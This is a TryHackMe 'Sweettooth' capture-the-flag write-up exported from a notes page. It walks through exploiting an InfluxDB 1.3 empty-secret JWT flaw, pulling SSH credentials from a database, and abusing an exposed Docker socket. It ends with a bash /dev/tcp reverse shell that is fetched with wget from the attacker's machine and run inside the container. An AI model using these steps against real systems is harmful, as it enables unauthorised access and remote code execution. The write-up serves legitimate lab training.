<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>THM Sweettooth</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
}
.highlight-gray {
	color: rgb(155,154,151);
}
.highlight-brown {
	color: rgb(100,71,58);
}
.highlight-orange {
	color: rgb(217,115,13);
}
.highlight-yellow {
	color: rgb(223,171,1);
}
.highlight-teal {
	color: rgb(15,123,108);
}
.highlight-blue {
	color: rgb(11,110,153);
}
.highlight-purple {
	color: rgb(105,64,165);
}
.highlight-pink {
	color: rgb(173,26,114);
}
.highlight-red {
	color: rgb(224,62,62);
}
.highlight-gray_background {
	background: rgb(235,236,237);
}
.highlight-brown_background {
	background: rgb(233,229,227);
}
.highlight-orange_background {
	background: rgb(250,235,221);
}
.highlight-yellow_background {
	background: rgb(251,243,219);
}
.highlight-teal_background {
	background: rgb(221,237,234);
}
.highlight-blue_background {
	background: rgb(221,235,241);
}
.highlight-purple_background {
	background: rgb(234,228,242);
}
.highlight-pink_background {
	background: rgb(244,223,235);
}
.highlight-red_background {
	background: rgb(251,228,228);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(55, 53, 47, 0.6);
	fill: rgba(55, 53, 47, 0.6);
}
.block-color-brown {
	color: rgb(100,71,58);
	fill: rgb(100,71,58);
}
.block-color-orange {
	color: rgb(217,115,13);
	fill: rgb(217,115,13);
}
.block-color-yellow {
	color: rgb(223,171,1);
	fill: rgb(223,171,1);
}
.block-color-teal {
	color: rgb(15,123,108);
	fill: rgb(15,123,108);
}
.block-color-blue {
	color: rgb(11,110,153);
	fill: rgb(11,110,153);
}
.block-color-purple {
	color: rgb(105,64,165);
	fill: rgb(105,64,165);
}
.block-color-pink {
	color: rgb(173,26,114);
	fill: rgb(173,26,114);
}
.block-color-red {
	color: rgb(224,62,62);
	fill: rgb(224,62,62);
}
.block-color-gray_background {
	background: rgb(235,236,237);
}
.block-color-brown_background {
	background: rgb(233,229,227);
}
.block-color-orange_background {
	background: rgb(250,235,221);
}
.block-color-yellow_background {
	background: rgb(251,243,219);
}
.block-color-teal_background {
	background: rgb(221,237,234);
}
.block-color-blue_background {
	background: rgb(221,235,241);
}
.block-color-purple_background {
	background: rgb(234,228,242);
}
.block-color-pink_background {
	background: rgb(244,223,235);
}
.block-color-red_background {
	background: rgb(251,228,228);
}
.select-value-color-default { background-color: rgba(206,205,202,0.5); }
.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
.select-value-color-green { background-color: rgba(0,135,107,0.2); }
.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
.select-value-color-red { background-color: rgba(255,0,26,0.2); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="99e129c1-ae62-4e80-92e0-f31f1d923d20" class="page sans"><header><img class="page-cover-image" src="THM%20Sweettooth%2099e129c1ae624e8092e0f31f1d923d20/candy.png" style="object-position:center 65.14%"/><h1 class="page-title">THM Sweettooth</h1></header><div class="page-body"><p id="24adcea0-1886-4fe3-ad3a-a23eb26b8f18" class="">
</p><p id="a8ef575b-feb8-416f-8382-a591a6487ec5" class=""><strong>Reconnaissance</strong></p><pre id="9398e859-4c22-4e0e-a33e-ddb15bd1216c" class="code code-wrap"><code>rustscan $IP --ulimit 10000 -- -sC -sV -</code></pre><p id="421b8c65-5786-47c6-99d3-f3d35106c31d" class="">
</p><p id="4e19b229-5255-4606-908d-cc7ab5259d27" class="">The port of interest is 8086, as the questions lead us there</p><p id="b169d7e9-aa56-4676-8928-a2197df2d27d" class="">
</p><p id="eecdd513-56cf-4bde-aadb-4121193f90be" class=""><strong>Getting the username</strong></p><p id="aa6ba375-a496-4b98-a5a2-1ab0b00355ce" class="">After a little bit of searching we find an article that explains how you can query for users, it is done with making a request to a certain url, We send a post request.</p><p id="dd42c6a7-c9ed-4224-a989-0d1440720533" class="">
</p><pre id="42806a3c-ae1d-47e6-aaae-38a0bcaea18b" class="code code-wrap"><code>curl -k -X POST http://10.10.176.110:8086/debug/requests</code></pre><p id="3a511727-290d-4865-b57c-fdade9e0a676" class="">
</p><figure id="97d6d0e7-3c60-4b4b-85d4-fbfb1c307908"><a href="https://docs.influxdata.com/influxdb/v1.3/tools/api/#debugrequests" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">InfluxDB API reference</div><div class="bookmark-description">This page documents an earlier version of InfluxDB. See the equivalent InfluxDB v2.0 is the latest stable version. InfluxDB v2.0 documentation: InfluxDB v2 API. The InfluxDB API provides a simple way to interact with the database. It uses HTTP response codes, HTTP authentication, JWT Tokens, and basic authentication, and responses are returned in JSON.</div></div><div class="bookmark-href"><img src="https://docs.influxdata.com/img/favicon.png" class="icon bookmark-icon"/>https://docs.influxdata.com/influxdb/v1.3/tools/api/#debugrequests</div></div></a></figure><p id="7108364a-bd25-417d-8eb9-3ba86d1c532f" class="">
</p><p id="3de889e4-16b4-4d9f-932d-ac1cf068cc3c" class=""><strong>Generating the token (JWT)</strong></p><p id="8bf41cf2-c31d-4126-aeed-dfcc6f7fa720" class="">After a while it returns data with the username.</p><p id="4f858f84-94f5-4f37-8fe0-82cdcf37cfd2" class="">The 0-day in version 1.3.0 was about the fact that people could login with username and password OR they could use a token, but the problem was anyone could generate this token there was no secret needed. There is a website to generate it </p><p id="d13fceae-13d4-4bfc-a631-05074d793931" class=""><a href="https://www.jwt.io">https://www.jwt.io</a></p><p id="1b04452b-d0d2-480d-aece-13283114b72b" class="">
</p><p id="58134456-3653-4df4-9a74-d2cff7bbce3e" class="">Once on the website, scroll down a bit and on the right that is we will generate our token with. You can see the names.</p><p id="58e714ef-43f8-42f3-9a1b-08ba31d303c8" class="">Header, payload, verify signature. We are going to enter one them one by one.</p><p id="48ddb0b2-efbe-4d66-9edf-76bd1f6f4c01" class="">Input the data you found, you can create an expiry token here: <a href="https://www.epochconverter.com/">https://www.epochconverter.com/</a></p><pre id="1d7ff77f-e7c6-49a4-a924-606a2620c890" class="code code-wrap"><code>**header**

{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;} 

**payload**

{&quot;username&quot;:&quot;&lt;input user name here&gt;&quot;,&quot;exp&quot;:&lt;enter epoch date&gt;}

**verify-signature**

The secret.. leave it empty</code></pre><p id="f2a47e2e-e6e8-404b-ae76-b43197a43e23" class="">
</p><p id="2fc3ae9d-2d4c-455f-b13c-5852e091c569" class="">Now copy the token and lets send a query request to see if its working.</p><p id="4976f07d-8c30-400b-a69d-f406718eaf2b" class="">
</p><pre id="f7a0b075-78b6-402e-8a80-a9344a83d1e4" class="code code-wrap"><code>curl -G -X POST &#x27;http:/{THM_IP}:8086/query&#x27; --data-urlencode &#x27;q=show users&#x27; -H &#x27;Authorization: Bearer {Your_Token}&#x27;</code></pre><p id="08e448e4-1352-4b07-89ce-62356ecc0065" class="">
</p><p id="68ff8126-3513-45a8-a321-1e491d5098e7" class="">Output: </p><pre id="93fe468a-85ac-47d8-bedd-d3879bac4275" class="code code-wrap"><code>{&quot;results&quot;:[{&quot;statement_id&quot;:0,&quot;series&quot;:[{&quot;columns&quot;:[&quot;user&quot;,&quot;admin&quot;],&quot;values&quot;:[[&quot;REDACTED&quot;,true]]}]}]}</code></pre><p id="1abfc5b3-0a83-44f3-9a4b-50232c80e3f0" class="">
</p><p id="62033adc-ca47-416d-8d2b-6d130b28a52a" class="">Yup!</p><p id="9c96ae35-fd4b-4cc0-a083-c257e7c5c2a5" class="">Now lets get the temperature of the water tank.</p><p id="bd6b6c05-fc77-4775-946f-56c8940c90a6" class="">
</p><p id="5a923648-8b44-48f5-a363-4f9782ecb6c2" class=""><strong>Getting the temperature of the water tank</strong></p><p id="013ed062-e786-4d32-a759-4fa9667f9fab" class="">Lets get the database name we need with: <code>SHOW DATABASES</code></p><p id="5f9f0519-41f0-42d4-89b9-5b77ab68d0b0" class="">To see what tables and columns a database has we can use <code>SHOW SERIES ON db_name</code></p><p id="e8395ab2-f290-452c-b9e1-74dc14121dff" class="">The output looks promising now we can narrow down our query</p><p id="5ae6d4cf-70b4-496f-9007-99611981b8b5" class="">
</p><p id="c0a3e3c0-0040-4b3f-af89-a9d821b58314" class="">This shows us the type of tanks available  so we can start with a query such as <code>SELECT * FROM water_tank</code> to see what it gives back to us.</p><pre id="b26d898d-6ad3-4596-961d-eebda6b38412" class="code code-wrap"><code>{&quot;results&quot;:[{&quot;statement_id&quot;:0,&quot;series&quot;:[{&quot;columns&quot;:[&quot;key&quot;],&quot;values&quot;:[[&quot;fruitjuice_tank&quot;],[&quot;gelatin_tank&quot;],[&quot;sugar_tank&quot;],[&quot;water_tank&quot;]]}]}]}</code></pre><p id="60fe14c5-e517-49a1-9328-8f8b2113203c" class="">
</p><p id="3cbf3548-67eb-450c-8ad4-5eda8fb37dfc" class="">Using the query from above we get this output. Columns: time, filling_height and temperature exactly what we needed.</p><pre id="1bf758d0-5642-4b40-a44d-6e852e87d071" class="code code-wrap"><code>{&quot;results&quot;:[{&quot;statement_id&quot;:0,&quot;series&quot;:[{&quot;name&quot;:&quot;water_tank&quot;,&quot;columns&quot;:[&quot;time&quot;,&quot;filling_height&quot;,&quot;temperature&quot;],&quot;values&quot;:[[&quot;2021-05-16T12:00:00Z&quot;,94.05,22.45]
--SNIP--</code></pre><p id="253e457e-24a6-4e0b-af03-5c67dfd194f4" class="">
</p><p id="94ccef5e-13df-4833-a68b-f30b82cb08a1" class="">The question is : <strong>What was the temperature of the water tank at 1621346400 (UTC Unix Timestamp)?</strong></p><p id="197fd897-348a-4ec1-9628-f09b8859df12" class="">
</p><p id="3d372c4a-be12-4a51-8a40-f9a05e4787a3" class="">So I converted the epoch time to human readable time on this website again and adjusted the format to the one I received from the output.</p><figure id="2cbd789e-c907-40c8-ab91-68374ebff9f9"><a href="https://www.epochconverter.com/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Epoch Converter</div><div class="bookmark-description">Easy epoch/Unix timestamp converter for computer programmers. Includes epoch explanation and conversion syntax in various programming languages.</div></div><div class="bookmark-href"><img src="https://www.epochconverter.com/img/epoch.ico" class="icon bookmark-icon"/>https://www.epochconverter.com/</div></div><img src="https://www.epochconverter.com/img/epochconverter-og-img.png" class="bookmark-image"/></a></figure><p id="9c5437b5-d26c-44a3-960f-52cc66f0ee10" class="">
</p><p id="c782bd88-9e56-4832-9fef-ae598f6971b0" class="">As we know the columns we can count and see what&#x27;s what.</p><p id="a0d0cf4c-769e-4eed-b6fa-d623c6cf55c8" class="">Now we just run the <code>SELECT * FROM water_tanks</code> query again and this time we grep on the date we converted from EpochConverter.</p><p id="a9dde25e-fe4a-41c6-b10e-c2fe5b7e2466" class="">
</p><p id="30ddc2d6-be4b-4f11-b86c-a881bdd4d590" class="">We specify the database <strong>tanks</strong> with the db key, look at the second value after the highlighted text and get the <strong>temperature</strong></p><pre id="b66f01e4-191a-4167-b22b-f974fb91c3bb" class="code code-wrap"><code>curl -G -X POST &#x27;{Your_IP}:8086/query?db=tanks&#x27; --data-urlencode &#x27;q=SELECT * FROM water_tank&#x27; -H &#x27;Authorization: Bearer {Your_Token}&#x27; | grep {date}</code></pre><p id="afdf662d-2d92-4d85-bb25-a33461d50724" class="">
</p><p id="09ba5f52-e398-4d9d-bf85-ac1a7d62ba74" class="">Bringing us to the next question.</p><p id="53698a55-7001-440b-84dc-cf9980954412" class="">
</p><p id="1e861be6-8456-487f-a3d3-a6167fa40c9d" class=""><strong>What is the highest rpm the motor of the mixer reached?</strong></p><p id="097995ac-79ae-4951-ac11-382d263d8b9a" class="">We can repeat the same steps we did for getting the temperature.</p><pre id="6ca706b1-98bb-4dad-8d44-fb5bc6dc2ef7" class="code code-wrap"><code>SHOW DATABASES;
SHOW SERIES on mixer
*Set db in url*
SELECT * FROM mixer_stats</code></pre><p id="1934ac8d-3ede-41ad-895e-bca14bd5eaf2" class="">
</p><p id="487516f4-169e-4690-8ebf-30edbd3cf075" class="">Now we get alot of data and it will take a long time to search for the highest RPM manually, so we will use a query called <code>MAX</code> which returns the greatest field value.</p><p id="6107ee92-b9a8-47c8-ba0b-1adc0fba8ff4" class="">
</p><pre id="cfdda469-d765-4377-9645-8261f2c49b6b" class="code code-wrap"><code>SELECT MAX(motor_rpm) FROM mixer_stats

#=&gt; {&quot;results&quot;:[{&quot;statement_id&quot;:0,&quot;series&quot;:[{&quot;name&quot;:&quot;mixer_stats&quot;,&quot;columns&quot;:[&quot;time&quot;,&quot;max&quot;],&quot;values&quot;:[[&quot;REDACTED&quot;,REDACTED]]}]}]}</code></pre><p id="71086434-5b4a-4027-883f-b32e13fab9eb" class="">
</p><p id="8ca807c2-2886-4199-bfe8-22d6fa0eada2" class="">
</p><p id="4aff9c97-58da-4e3f-af0f-0aeaf87ae3f0" class=""><strong>What username do you find in one of the databases?</strong></p><p id="3c101390-ccf0-4883-a077-bb64343d57a0" class="">For the ssh username we just do the <code>SHOW SERIES</code> query on the <code>creds</code> database. </p><p id="392fcbcd-fea6-4bf2-a7f7-8ec00c8b0a57" class="">While querying for the series we also see a value named ssh, lets look into that with <code>SELECT * FROM ssh</code> </p><p id="89bdb5a3-2146-4305-b64e-81d3c8c93f71" class="">This shows us the columns: time, pw and user. Just look at the second value and we got the SSH password to the user</p><p id="e13d1e3b-d007-4f5c-a640-b71bc5b6eda1" class="">We log into the SSH with the credentials we found and get <strong>user.txt</strong></p><p id="d2c18fac-90fd-4259-aa28-b029ed959c0d" class="">
</p><p id="aba3a3fd-a4d3-4546-ae4f-fd8b5e6893c8" class="">
</p><p id="d76eb384-00f3-4906-bf67-a33012198656" class=""><strong>Additional</strong> <strong>information gathering</strong></p><p id="4ad00518-4028-4575-aa96-1d89ab235ce2" class="">Looking for hints we can get <a href="http://linpeas.sh">linpeas.sh</a> on the system, we do that with a python server, and wget the script and execute it with &#x27;chmod +x&#x27; in /tmp/ assuming you know how.</p><p id="5cb130a9-721d-46fa-9d6f-36227bb2a229" class="">
</p><p id="61532819-840a-4207-8e4f-97bd37ddabc2" class="">While running <a href="http://linpeas.sh"><code>linpeas.sh</code></a> we found interesting files. All around the web there are people warning about the dangers about a writable docker socket.</p><ul id="b67bf381-9d37-4b6a-a734-2eb30a91f757" class="bulleted-list"><li><del>A docker.env file</del></li></ul><ul id="e7f502de-f3d3-46de-9ef4-b08592da75d3" class="bulleted-list"><li>docker socket</li></ul><p id="73546944-02b3-4369-b2d2-4cc26839bd2c" class="">We could also see a listener on port 8080 with <code>./linspy</code> </p><p id="5d52ec1b-9780-47b1-8472-377dc8ee81d9" class="">
</p><p id="87e1eac5-7343-46dc-92f0-ce042139754e" class="">
</p><p id="340f511f-1d14-4055-a930-3805bb95ede0" class=""><strong>Showing the mounts</strong></p><p id="2d9831ae-fdb2-4ae4-a0c2-80f6ceeb8cc6" class="">While running a few scans I saw some storages fly by and  came across this command. </p><p id="6cc94799-3670-4649-8480-0f0d99fd38d0" class="">This command shows us a virtual storage interesting.</p><pre id="30fbcd90-dc75-4876-bbf7-bf77774a685f" class="code code-wrap"><code>findmnt
# We notice /dev/xvda1</code></pre><p id="eab3eccc-a3de-4f02-8b90-b6de8d496560" class="">
</p><p id="c7a62e1d-e0c9-40a2-bf4c-961e5b40772c" class="">
</p><p id="f2ebc278-9ddc-4d10-992c-3bc522191a97" class=""><strong>Exposing the docker container to my network</strong></p><p id="9ed3cee1-a971-4c8c-aacb-8c4dd3e2f3a9" class="">Here we expose the docker daemon so we can get access to it.</p><p id="fd648940-cd16-4c0f-963e-5c1a900a7353" class="">Using port forwarding we expose port 8080 to our <a href="http://localhost">localhost</a> and now we can talk to it with curl, exposing docker.sock </p><pre id="cc6ba209-4a6d-40f1-aa1b-b8e0dc95d27d" class="code code-wrap"><code>ssh {user}@10.10.87.239 -L 8080:localhost:8080 -p 2222</code></pre><p id="b9840aec-69fe-4707-9c04-9504f301be6d" class="">
</p><p id="539811c1-f276-46d7-a19e-698ea90f527f" class="">
</p><p id="8d23357a-42ae-4b06-bc2c-885ce712cdcb" class=""><strong>Installing Docker on host to connect with the machine</strong></p><p id="8681ef5a-973b-493b-b4b2-e6c61044edc3" class="">Once we downloaded Docker on our host. We use the following command to see the name of the container that we forwarded.</p><p id="ce3be755-2bda-437f-80a4-b81e32e64d70" class="">
</p><pre id="401d89ef-f5a2-420f-9081-e493e1a34a4c" class="code code-wrap"><code>docker -H tcp://localhost:8080 container ls                                      
CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS          PORTS                                          NAMES                         
7f337cb5d828   sweettoothinc:latest   &quot;/bin/bash -c &#x27;chmod…&quot;   26 minutes ago   Up 26 minutes   0.0.0.0:8086-&gt;8086/tcp, 0.0.0.0:2222-&gt;22/tcp   sweettoothinc</code></pre><p id="de0af816-5971-4c90-80de-18d1094e24e9" class="">
</p><p id="d1d773ea-9060-47d9-8bec-493d2b235419" class="">If we specify the container name we can execute commands.</p><p id="1675c2b9-b1b8-4b29-bfa5-24a1e6421d8d" class="">Now because we can run commands we might aswell run a reverse shell. </p><p id="fcd8b09e-63e4-4a96-974f-626921db6ade" class="">
</p><p id="0d5e8bec-822e-4f7a-becc-898c9028e16d" class="">Put this in a folder of choice and run a python server.</p><pre id="00e1ee5a-20de-4fb2-92fe-53295d63a724" class="code code-wrap"><code>#revshell.sh
bash -i &gt;&amp; /dev/tcp/{Your_Host_IP}/6565 0&gt;&amp;1</code></pre><p id="d4adbdaf-75f3-433e-8108-d2c7d7d18f20" class="">
</p><p id="913c25ce-26da-48f5-8470-e07de0a53454" class="">First we run a listener so it can receive the connection, then we download the file from our container and then we execute the file we downloaded.</p><pre id="5455687f-73ae-4d7d-a51c-c2247a9ed94a" class="code code-wrap"><code>nc -lvnp 6565

docker -H tcp://localhost:8080 container exec sweettoothinc wget 10.9.5.136/revshell.sh

docker -H tcp://localhost:8080 container exec sweettoothinc bash -i revshell.sh</code></pre><p id="cdb6746d-47ca-47fa-b2f8-c28c66b46ea2" class="">
